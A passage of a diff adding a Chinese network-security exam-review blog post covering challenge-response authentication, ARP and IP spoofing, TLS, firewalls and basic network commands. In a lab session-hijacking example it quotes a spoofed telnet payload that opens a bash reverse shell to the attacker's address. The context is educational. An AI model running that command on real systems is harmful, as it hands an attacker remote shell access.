+<li><i class="far fa-square fa-fw"></i> 👌认证中的抗重放机制：时间戳和挑战应答（参见16.1.4小节）</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌基于挑战应答的身份认证（主要见ppt）、keberos认证（不在考试范围）</li>
+</ul>
+</blockquote>
+<h3 id="质询应答challengeresponse的基本逻辑" class="headerLink">
+    <a href="#%e8%b4%a8%e8%af%a2%e5%ba%94%e7%ad%94challengeresponse%e7%9a%84%e5%9f%ba%e6%9c%ac%e9%80%bb%e8%be%91" class="header-mark"></a>质询/应答challenge/response的基本逻辑</h3><ul>
+<li>B要完成对A的身份认证
+<ul>
+<li>身份认证基于A所知道的某个秘密（例如密钥）</li>
+<li>首先B发给A一个随机数（challenge）</li>
+<li>A收到这个随机数之后，对它做某种变换，得到response报文，并发送回去</li>
+<li>Response 同时依赖于随机数（challenge）和A说知道的这个秘密</li>
+<li>B收到response后，可以验证A是知道这个秘密的</li>
+</ul>
+</li>
+<li>在有的协议中，这个challenge也称为nonce（可能是明文传输，也可能是密文传输）</li>
+<li>A生成Response的典型变换有：
+<ul>
+<li>A使用密钥加密，说明A知道这个密钥</li>
+<li>有时会对challenge简单运算，比如增一，再做加密处理</li>
+</ul>
+</li>
+<li>质询与应答是构造更复杂的交互式认证协议的基本组件</li>
+</ul>
+<h3 id="质询应答的实现方式" class="headerLink">
+    <a href="#%e8%b4%a8%e8%af%a2%e5%ba%94%e7%ad%94%e7%9a%84%e5%ae%9e%e7%8e%b0%e6%96%b9%e5%bc%8f" class="header-mark"></a>质询应答的实现方式</h3><ul>
+<li>
+<p>使用对称密钥</p>
+<ul>
+<li>对称密钥加密</li>
+<li>消息散列、消息认证码</li>
+</ul>
+</li>
+<li>
+<p>使用公钥密码</p>
+</li>
+<li>
+<p>数字签名</p>
+</li>
+<li>
+<p>弱的身份认证</p>
+<ul>
+<li>基于口令、PIN码等</li>
+<li>动态口令（半强的）</li>
+</ul>
+</li>
+<li>
+<p>强的（基于密码技术的）身份认证</p>
+<ul>
+<li>挑战/应答技术（质询与应答技术）</li>
+</ul>
+</li>
+<li>
+<p>基于可信第三方的身份认证（不仅实现身份认证，还解决密钥分发问题）</p>
+<ul>
+<li>Kerberos协议（课程不讲细节）</li>
+<li>Needham-Schroeder协议</li>
+</ul>
+</li>
+</ul>
+<p>==小结==</p>
+<blockquote>
+<ul>
+<li>
+<p>Kerberos主要是局域网上的认证系统，它早期基于对称算法，封装了加密、认证等安全服务，提供了统一的用户接口。后期Kerberos也开始支持公钥，使用证书。（本课程略）</p>
+</li>
+<li>
+<p>PKI/CA好像是解决电子商务安全的正确道路。CA是一个离线中心，因此适合互联网这种分布式又管理松散的环境。但是维护一个CA（不管是商用CA或自己独立的CA）给人的感觉是过于复杂。</p>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><i class="far fa-square fa-fw"></i> 👌补充：访问控制和审计技术。访问控制概念、作用、3种访问控制策略（强制访问控制、自主访问控制、基于角色的访问控制，…）、访问控制矩阵（不在考试范围）</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><i class="far fa-square fa-fw"></i> 👌linux文件系统权限（见中文ppt）</li>
+</ul>
+</blockquote>
+<h3 id="常见网络攻击" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e7%bd%91%e7%bb%9c%e6%94%bb%e5%87%bb" class="header-mark"></a>常见网络攻击</h3><blockquote>
+<ul>
+<li><i class="far fa-square fa-fw"></i> 👌嗅探、欺骗(ARP欺骗、IP欺骗)、TCP会话劫持、拒绝服务攻击四类攻击的特点、常见的防范方法。</li>
+</ul>
+</blockquote>
+<h4 id="嗅探的目的" class="headerLink">
+    <a href="#%e5%97%85%e6%8e%a2%e7%9a%84%e7%9b%ae%e7%9a%84" class="header-mark"></a>嗅探的目的</h4><ul>
+<li>窃取各种用户名和口令</li>
+<li>窃取机密的信息
+<ul>
+<li>如电子邮件正文及附件、网络打印的文档等</li>
+</ul>
+</li>
+<li>窥探底层的协议信息
+<ul>
+<li>如DNS的IP地址、本机IP地址、本机MAC地址，远程主机的IP地址、网关的IP地址、一次TCP连接的Sequence Numbe</li>
+</ul>
+</li>
+<li>中间人攻击时篡改数据的基础</li>
+</ul>
+<h4 id="欺骗arp欺骗ip欺骗" class="headerLink">
+    <a href="#%e6%ac%ba%e9%aa%97arp%e6%ac%ba%e9%aa%97ip%e6%ac%ba%e9%aa%97" class="header-mark"></a>欺骗(ARP欺骗、IP欺骗)</h4><p>==ARP协议工作原理==</p>
+<p>①每台主机设备上都拥有一个ARP缓存(ARP Cache)</p>
+<p>②检查自己的ARP缓存，有，直接映射，无，广播ARP请求包（见下页图）</p>
+<p>③检查数据包中的目标IP地址是否与自己的IP地址一致，如一致，发送ARP响应，告知MAC地址</p>
+<p>④源节点在收到这个ARP响应数据包后，将得到的目标主机IP地址和MAC地址对映射表项添加到自己的ARP缓存中</p>
+<p><code>ARP欺骗：发送伪造ARP消息，对特定IP所对应的MAC地址进行假冒欺骗，从而达到恶意目的</code></p>
+<p>==ARP包结构及其封装==</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107212841256.png" title="image-20240107212841256" data-thumbnail="/posts/cyber_security/image-20240107212841256.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107212841256.png"
+            srcset="/posts/cyber_security/image-20240107212841256.png, /posts/cyber_security/image-20240107212841256.png 1.5x, /posts/cyber_security/image-20240107212841256.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107212841256.png" height="594"  width="1323" >
+    </a></figure></p>
+<p>场景1</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107212903930.png" title="image-20240107212903930" data-thumbnail="/posts/cyber_security/image-20240107212903930.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107212903930.png"
+            srcset="/posts/cyber_security/image-20240107212903930.png, /posts/cyber_security/image-20240107212903930.png 1.5x, /posts/cyber_security/image-20240107212903930.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107212903930.png" height="769"  width="1300" >
+    </a></figure></p>
+<p>场景2</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107212927236.png" title="image-20240107212927236" data-thumbnail="/posts/cyber_security/image-20240107212927236.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107212927236.png"
+            srcset="/posts/cyber_security/image-20240107212927236.png, /posts/cyber_security/image-20240107212927236.png 1.5x, /posts/cyber_security/image-20240107212927236.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107212927236.png" height="731"  width="1291" >
+    </a></figure></p>
+<h5 id="arp攻击的应用场景" class="headerLink">
+    <a href="#arp%e6%94%bb%e5%87%bb%e7%9a%84%e5%ba%94%e7%94%a8%e5%9c%ba%e6%99%af" class="header-mark"></a>ARP攻击的应用场景</h5><ul>
+<li>利用ARP欺骗进行交换网络中的嗅探</li>
+<li>ARP欺骗构造中间人攻击，从而实施TCP会话劫持</li>
+<li>ARP病毒：中毒的机器会伪造某台电脑的MAC地址，如果该伪造地址为网关服务器的地址，那么对整个网络均会造成影响，用户表现为上网经常瞬断</li>
+<li>ARP欺骗挂马</li>
+</ul>
+<h5 id="arp欺骗攻击防范措施" class="headerLink">
+    <a href="#arp%e6%ac%ba%e9%aa%97%e6%94%bb%e5%87%bb%e9%98%b2%e8%8c%83%e6%8e%aa%e6%96%bd" class="header-mark"></a>ARP欺骗攻击防范措施</h5><ul>
+<li>静态绑定关键主机的IP地址与MAC地址映射关系
+<ul>
+<li>网关/关键服务器</li>
+<li>&ldquo;arp-s IP地址MAC地址类型&rdquo;</li>
+</ul>
+</li>
+<li>使用相应的ARP防范工具
+<ul>
+<li>ARP防火墙</li>
+</ul>
+</li>
+<li>使用VLAN虚拟子网细分网络拓扑</li>
+</ul>
+<h5 id="网络层----ip源地址欺骗" class="headerLink">
+    <a href="#%e7%bd%91%e7%bb%9c%e5%b1%82----ip%e6%ba%90%e5%9c%b0%e5%9d%80%e6%ac%ba%e9%aa%97" class="header-mark"></a>网络层 &ndash; IP源地址欺骗</h5><ul>
+<li>IP源地址欺骗 – 假冒IP攻击
+<ul>
+<li>伪造具有虚假源地址的IP数据包进行发送</li>
+<li>目的：隐藏攻击者身份、假冒其他计算机</li>
+</ul>
+</li>
+<li>IP源地址欺骗原理
+<ul>
+<li>路由转发只是用目标IP地址，不对源做验证</li>
+<li>通常情况：无法获得响应包</li>
+<li>在无法获得响应包的情况下，可通过猜测TCP三次握手中所需的信息，假冒IP建立起TCP连接</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>针对Web应用程序的常见攻击的特点、常见的防范方法？（SQL注入、XSS跨站脚本、CSRF跨站请求伪造）。</p>
+</blockquote>
+<h2 id="十七传输层安全" class="headerLink">
+    <a href="#%e5%8d%81%e4%b8%83%e4%bc%a0%e8%be%93%e5%b1%82%e5%ae%89%e5%85%a8" class="header-mark"></a>十七、传输层安全</h2><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌Web安全威胁有哪些？（从web通信中涉及的浏览器、web服务器和通信信道的角度来讨论web安全威胁）</li>
+</ul>
+</blockquote>
+<p>Web面临的一些安全威胁的分类。</p>
+<p>一种归类方式：</p>
+<p><code>被动攻击</code>：在浏览器和服务器通信时窃听，获得原本被限制使用的权限</p>
+<p><code>主动攻击</code>：伪装成其他用户、篡改客户和服务器之间的消息或篡改Web站点的信息</p>
+<p>另一种分类方法：</p>
+<p>按威胁的位置分类：Web服务器、Web浏览器和服务器与浏览器之间的网络通信。</p>
+<h3 id="web安全性威胁对照表" class="headerLink">
+    <a href="#web%e5%ae%89%e5%85%a8%e6%80%a7%e5%a8%81%e8%83%81%e5%af%b9%e7%85%a7%e8%a1%a8" class="header-mark"></a>Web安全性威胁对照表</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/1704634437528.png" title="1704634437528" data-thumbnail="/posts/cyber_security/1704634437528.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704634437528.png"
+            srcset="/posts/cyber_security/1704634437528.png, /posts/cyber_security/1704634437528.png 1.5x, /posts/cyber_security/1704634437528.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704634437528.png" height="577"  width="1120" >
+    </a></figure></p>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌web流量安全方法，即按照协议分层，各层安全网络协议有哪些？（图17.1TCP/IP协议栈中安全功能的相对位置）</li>
+</ul>
+</blockquote>
+<h3 id="tcpip协议栈中安全功能的相对位置" class="headerLink">
+    <a href="#tcpip%e5%8d%8f%e8%ae%ae%e6%a0%88%e4%b8%ad%e5%ae%89%e5%85%a8%e5%8a%9f%e8%83%bd%e7%9a%84%e7%9b%b8%e5%af%b9%e4%bd%8d%e7%bd%ae" class="header-mark"></a>TCP/IP协议栈中安全功能的相对位置</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/1704634608919.png" title="1704634608919" data-thumbnail="/posts/cyber_security/1704634608919.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704634608919.png"
+            srcset="/posts/cyber_security/1704634608919.png, /posts/cyber_security/1704634608919.png 1.5x, /posts/cyber_security/1704634608919.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704634608919.png" height="264"  width="1015" >
+    </a></figure></p>
+<h3 id="tls体系结构" class="headerLink">
+    <a href="#tls%e4%bd%93%e7%b3%bb%e7%bb%93%e6%9e%84" class="header-mark"></a>TLS体系结构</h3><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌TLS体系结构、SSL/TLS提供哪些服务？SSL/TLS协议实现、记录协议</li>
+</ul>
+</blockquote>
+<p>TLS为TCP提供了可靠的端到端的安全服务。TLS不是简单的单个协议而是两层协议。</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704634930678.png" title="1704634930678" data-thumbnail="/posts/cyber_security/1704634930678.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704634930678.png"
+            srcset="/posts/cyber_security/1704634930678.png, /posts/cyber_security/1704634930678.png 1.5x, /posts/cyber_security/1704634930678.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704634930678.png" height="355"  width="1038" >
+    </a></figure></p>
+<blockquote>
+<ul>
+<li><i class="far fa-square fa-fw"></i> 👌TLS的握手协议过程、基于wireshark的SSL/TLS数据包捕获结果分析（考试重点，尤其是握手协议过程，参见图17.6）</li>
+</ul>
+</blockquote>
+<h3 id="握手协议过程" class="headerLink">
+    <a href="#%e6%8f%a1%e6%89%8b%e5%8d%8f%e8%ae%ae%e8%bf%87%e7%a8%8b" class="header-mark"></a>✨握手协议过程</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107214547593.png" title="image-20240107214547593" data-thumbnail="/posts/cyber_security/image-20240107214547593.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107214547593.png"
+            srcset="/posts/cyber_security/image-20240107214547593.png, /posts/cyber_security/image-20240107214547593.png 1.5x, /posts/cyber_security/image-20240107214547593.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107214547593.png" height="796"  width="1063" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704635100704.png" title="1704635100704" data-thumbnail="/posts/cyber_security/1704635100704.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704635100704.png"
+            srcset="/posts/cyber_security/1704635100704.png, /posts/cyber_security/1704635100704.png 1.5x, /posts/cyber_security/1704635100704.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704635100704.png" height="841"  width="676" >
+    </a></figure></p>
+<h3 id="wireshark抓包实验" class="headerLink">
+    <a href="#wireshark%e6%8a%93%e5%8c%85%e5%ae%9e%e9%aa%8c" class="header-mark"></a>✨✨wireshark抓包实验</h3><p>可以转这篇：<a href="/posts/knowledge/review_notes/wireshark/" rel="">wireshark抓包实验</a></p>
+<h4 id="实际抓包截图分析" class="headerLink">
+    <a href="#%e5%ae%9e%e9%99%85%e6%8a%93%e5%8c%85%e6%88%aa%e5%9b%be%e5%88%86%e6%9e%90" class="header-mark"></a>实际抓包截图分析</h4><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107214735588.png" title="image-20240107214735588" data-thumbnail="/posts/cyber_security/image-20240107214735588.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107214735588.png"
+            srcset="/posts/cyber_security/image-20240107214735588.png, /posts/cyber_security/image-20240107214735588.png 1.5x, /posts/cyber_security/image-20240107214735588.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107214735588.png" height="802"  width="1400" >
+    </a></figure></p>
+<p>实际的场景：客户端（10.0.2.5） ， sever（10.0.2.6），Attacker （10.0.2.4）</p>
+<p>客户端（10.0.2.5） telnet到sever（10.0.2.6）时的最后一个数据包，</p>
+<p>下一数据就是伪造的数据包</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107214821535.png" title="image-20240107214821535" data-thumbnail="/posts/cyber_security/image-20240107214821535.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107214821535.png"
+            srcset="/posts/cyber_security/image-20240107214821535.png, /posts/cyber_security/image-20240107214821535.png 1.5x, /posts/cyber_security/image-20240107214821535.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107214821535.png" height="788"  width="1425" >
+    </a></figure></p>
+<p>攻击者伪造的数据包：冒充客户端（10.0.2.5） 发送telnet数据到sever（10.0.2.6），数据</p>
+<p>内容是”/bin/bash -i &gt; /dev/tcp/10.0.2.4/9090 0&lt;&amp;1 2&gt;&amp;1”</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107214843510.png" title="image-20240107214843510" data-thumbnail="/posts/cyber_security/image-20240107214843510.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107214843510.png"
+            srcset="/posts/cyber_security/image-20240107214843510.png, /posts/cyber_security/image-20240107214843510.png 1.5x, /posts/cyber_security/image-20240107214843510.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107214843510.png" height="638"  width="1500" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107214853298.png" title="image-20240107214853298" data-thumbnail="/posts/cyber_security/image-20240107214853298.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107214853298.png"
+            srcset="/posts/cyber_security/image-20240107214853298.png, /posts/cyber_security/image-20240107214853298.png 1.5x, /posts/cyber_security/image-20240107214853298.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107214853298.png" height="562"  width="762" >
+    </a></figure></p>
+<p>上图1为攻击的执行结果：可以看到攻击者ifconfig时的输出已经是10.0.2.6.</p>
+<p>上图2为：攻击者发送的数据包格式</p>
+<h2 id="十九无线网络安全" class="headerLink">
+    <a href="#%e5%8d%81%e4%b9%9d%e6%97%a0%e7%ba%bf%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8" class="header-mark"></a>十九、无线网络安全</h2><ol start="43">
+<li>wifi登录密码破解原理</li>
+</ol>
+<p>防火墙和入侵检测</p>
+<ol start="44">
+<li>防火墙特点、类型</li>
+</ol>
+<h3 id="防火墙类型" class="headerLink">
+    <a href="#%e9%98%b2%e7%81%ab%e5%a2%99%e7%b1%bb%e5%9e%8b" class="header-mark"></a>防火墙类型</h3><ul>
+<li>
+<p>==包过滤防火墙==</p>
+<p>过滤进入和外出的数据包，仅监视IP和TCP/UDP的头部, 不考虑负载</p>
+<ul>
+<li>
+<p>静态包过滤（无状态）：访问控制列表ACL</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107215157320.png" title="image-20240107215157320" data-thumbnail="/posts/cyber_security/image-20240107215157320.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107215157320.png"
+            srcset="/posts/cyber_security/image-20240107215157320.png, /posts/cyber_security/image-20240107215157320.png 1.5x, /posts/cyber_security/image-20240107215157320.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107215157320.png" height="305"  width="862" >
+    </a></figure></p>
+</li>
+<li>
+<p>动态包过滤（有状态）：跟踪连接状态并根据连接状态决定是接受还是拒绝数据包</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107215206925.png" title="image-20240107215206925" data-thumbnail="/posts/cyber_security/image-20240107215206925.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107215206925.png"
+            srcset="/posts/cyber_security/image-20240107215206925.png, /posts/cyber_security/image-20240107215206925.png 1.5x, /posts/cyber_security/image-20240107215206925.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107215206925.png" height="231"  width="1382" >
+    </a></figure></p>
+</li>
+</ul>
+</li>
+<li>
+<p>电路级网关：传输层代理，运行在传输层，检测IP地址和端口号(TCP/UDP)来确定连接是否合法</p>
+</li>
+<li>
+<p>不允许内外部网络直接连接</p>
+</li>
+<li>
+<p>一旦建立连接后，电路级网关只负责为双方传递数据包而不再做任何过滤</p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240107215248274.png" title="image-20240107215248274" data-thumbnail="/posts/cyber_security/image-20240107215248274.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240107215248274.png"
+            srcset="/posts/cyber_security/image-20240107215248274.png, /posts/cyber_security/image-20240107215248274.png 1.5x, /posts/cyber_security/image-20240107215248274.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240107215248274.png" height="517"  width="1100" >
+    </a></figure></p>
+<p>电路级网关中继外网用户到内网服务器的访问（典型的如SOCKS）</p>
+<ul>
+<li>应用层网关：代理服务器,对所有数据包执行深度检查,SQL，具有检测恶意和可疑数据包的能力</li>
+<li>应用层网关接受外网客户提交的访问内网服务器的请求，检查流入的IP包负载是否满足安全性要求。通过检查后，才将客户的请求传递给内网服务器，并缓存内网服务器返回给外网客户的结果</li>
+</ul>
+<h2 id="其他" class="headerLink">
+    <a href="#%e5%85%b6%e4%bb%96" class="header-mark"></a>其他：</h2><blockquote>
+<ul>
+<li><i class="far fa-square fa-fw"></i> 👌与实验相关的Windows和Linux下最常见的命令行命令、常见端口80/443，23、25/110 Ping、nslookup、ipconfig、ifconfig、arp、chmod、ls</li>
+</ul>
+</blockquote>
+<h3 id="windows常用基本命令" class="headerLink">
+    <a href="#windows%e5%b8%b8%e7%94%a8%e5%9f%ba%e6%9c%ac%e5%91%bd%e4%bb%a4" class="header-mark"></a>windows常用基本命令</h3><h4 id="ping" class="headerLink">
+    <a href="#ping" class="header-mark"></a>ping</h4><p><strong>ping命令是个使用频率极高的网络诊断工具，在Windows、Unix和Linux系统下均适用。</strong></p>
+<p>它是TCP/IP协议的一部分，<u>用于确定本地主机是否能与另一台主机交换数据包</u>。根据返回的信息，我们可以推断TCP/IP参数设置是否正确以及运行是否正常。</p>
+<p>需要注意的是，成功与另一台主机进行一次或两次数据报交换并不表示TCP/IP配置就是正确的，必须成功执行大量的数据报交换，才能确信TCP/IP的正确性。</p>
+<p>==ping命令的应用格式==</p>
+<ol>
+<li>ping+IP地址或主机域名；</li>
+<li>ping+IP地址或主机域名+命令参数；</li>
+<li>ping+命令参数+IP地址或主机域名 。</li>
+</ol>
+<p>注意，“+”要换成空格！当我们使用第①种格式时，默认只发送四个数据包。</p>
+<h4 id="nslookup" class="headerLink">
+    <a href="#nslookup" class="header-mark"></a>nslookup</h4><p>nslookup (全称 name server lookup) ，是一个在命令行界面下的网络工具，它有两种模式: 交互 &amp; 非交互，进入交互模式在命令行界面直接输入nslookup按回车，非交互模式则是后面跟上查询的域名或者 IP 地址按回车。</p>
+<p>nslookup语法格式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup –option1 –option2 host-to-find dns-server
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nslookup baidu.com
+</span></span><span class="line"><span class="cl">nslookup -ty<span class="o">=</span>ptr 8.8.8.8		<span class="c1"># PTR反向DNS解析</span>
+</span></span><span class="line"><span class="cl">nslookup/?		<span class="c1"># 帮助界面</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="ipconfig" class="headerLink">
+    <a href="#ipconfig" class="header-mark"></a>ipconfig</h4><p>ipconfig是dos命令，可以在运行【win+r】里输入cmd，回车后进入命令行界面下进行操作。相关命令的作用如下：</p>
+<ul>
+<li><code>ipconfig /?</code> 查询ipconfig的详细使用方法，例如可以附带的参数，每个参数的具体含义以及示例</li>
+<li><code>ipconfig /all</code> 命令，相对于ipconfig命令，加上了all参数之后显示的信息将会更为完善，例如IP的主机信息，DNS信 息，物理地址信息，DHCP服务器信息等等</li>
+<li><code>ipconfig /release</code> 释放现有的IP地 址</li>
+<li><code>ipconfig /renew</code> 获得的IP地址和之前的地址一样，只有在原有的地址被占用的情况下才会获得一个新的地址</li>
+<li><code>ipconfig /displaydns</code> 显示本地DNS内容</li>
+<li><code>ipconfig /flushdns</code> 刷新DNS记录，如果电脑上不去网了就可以用这个方法来恢复上网。</li>
+<li><code>Linux /Ubuntu</code>刷新DNS缓存 在Linux中刷新DNS记录</li>
+</ul>
+<h4 id="ifconfig" class="headerLink">
+    <a href="#ifconfig" class="header-mark"></a>ifconfig</h4><p>ifconfig 是 Linux 中用来查询和配置网络接口卡（网卡）的命令，英文全称是network interfaces configuring。</p>
+<p>使用 ifconfig 命令对网卡所做的配置都是临时配置，重启之后都会被还原的。如果要永久配置网卡则需要通过修改配置文件的方式。</p>
+<p>==命令==</p>
+<ul>
+<li><code>ifconfig</code>：显示激活的网卡信息</li>
+<li><code>ifconfig -a</code>：显示所有的网卡信息</li>
+<li><code>ifconfig -s</code>：显示网卡的简要信息</li>
+<li><code>ifconfig [网卡名称]//例：ifconfig enp0s3</code>：显示指定网卡的信息</li>
+</ul>
+<h4 id="arp" class="headerLink">
+    <a href="#arp" class="header-mark"></a>arp</h4><p>arp是地址解析协议，其基本功能为透过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。它是IPv4中网络层必不可少的协议，不过在IPv6中已不再适用，并被邻居发现协议（NDP）所替代。</p>
+<p>==命令==</p>
+<ul>
+<li><code>arp -a</code> ，当你需要显示当期ip地址对应的mac地址时使用。</li>
+<li><code>arp -s</code> ，当你需要手动添加或绑定一条arp记录时使用。</li>
+<li><code>arp -d</code>，当你觉得某条arp记录有问题时，可以删除。</li>
+</ul>
+<h4 id="chmod" class="headerLink">
+    <a href="#chmod" class="header-mark"></a>✨chmod</h4><p>Linux/Unix 的档案调用权限分为三级 : 档案拥有者、群组、其他。利用 chmod 可以藉以控制档案如何被他人所调用。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mode : 权限设定字串，格式如下 : <span class="o">[</span>ugoa...<span class="o">][[</span>+-<span class="o">=][</span>rwxX<span class="o">]</span>...<span class="o">][</span>,...<span class="o">]</span>，其中
+</span></span><span class="line"><span class="cl">u 表示该档案的拥有者，g 表示与该档案的拥有者属于同一个群体<span class="o">(</span>group<span class="o">)</span>者，o 表示其他以外的人，a 表示这三者皆是。
+</span></span><span class="line"><span class="cl">+ 表示增加权限、- 表示取消权限、<span class="o">=</span> 表示唯一设定权限。
+</span></span><span class="line"><span class="cl">r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。
+</span></span><span class="line"><span class="cl">-c : 若该档案权限确实已经更改，才显示其更改动作
+</span></span><span class="line"><span class="cl">-f : 若该档案权限无法被更改也不要显示错误讯息
+</span></span><span class="line"><span class="cl">-v : 显示权限变更的详细资料
+</span></span><span class="line"><span class="cl">-R : 对目前目录下的所有档案与子目录进行相同的权限变更<span class="o">(</span>即以递回的方式逐个变更<span class="o">)</span>
+</span></span><span class="line"><span class="cl">--help : 显示辅助说明
+</span></span><span class="line"><span class="cl">--version : 显示版本
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Linux 系统中，文件的基本权限由 9 个字符组成，以 <code>rwxrw-r-x</code>为例，我们可以使用数字来代表各个权限，各个权限与数字的对应关系如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">r --&gt; <span class="m">4</span>
+</span></span><span class="line"><span class="cl">w --&gt; <span class="m">2</span>
+</span></span><span class="line"><span class="cl">x --&gt; <span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于这 9 个字符分属 3 类用户，因此每种用户身份包含 3 个权限（r、w、x），通过将 3 个权限对应的数字累加，最终得到的值即可作为每种用户所具有的权限。</p>
+<p>拿 <code>rwxrw-r-x</code> 来说，所有者、所属组和其他人分别对应的权限值为：
+所有者 = <code>rwx</code> = 4+2+1 = 7
+所属组 = <code>rw-</code> = 4+2 = 6
+其他人 = <code>r-x</code> = 4+1 = 5</p>
+<p>所以，此权限对应的权限值就是 765。</p>
+<h4 id="ls" class="headerLink">
+    <a href="#ls" class="header-mark"></a>ls</h4><p>列出文件是普通 Linux 用户和系统管理员最常承担的任务之一。在 Linux 中，ls 命令是“ list ”的缩写，用于列出或显示目录的内容。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:center">功能描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>ls -m</code></td>
+<td style="text-align:center">列出以逗号分隔的目录内容。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -Q</code></td>
+<td style="text-align:center">显示用引号括起来的目录内容。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -l</code></td>
+<td style="text-align:center">以长列表格式显示文件。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -lh</code></td>
+<td style="text-align:center">以人类可读的格式显示文件大小。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -g</code></td>
+<td style="text-align:center">省略组所有权列。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -F</code></td>
+<td style="text-align:center">向目录添加正斜杠。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -i</code></td>
+<td style="text-align:center">显示文件和目录的 inode 数量。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -a</code></td>
+<td style="text-align:center">显示所有文件，包括隐藏文件。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls *.</code></td>
+<td style="text-align:center">根据文件扩展名过滤文件。</td>
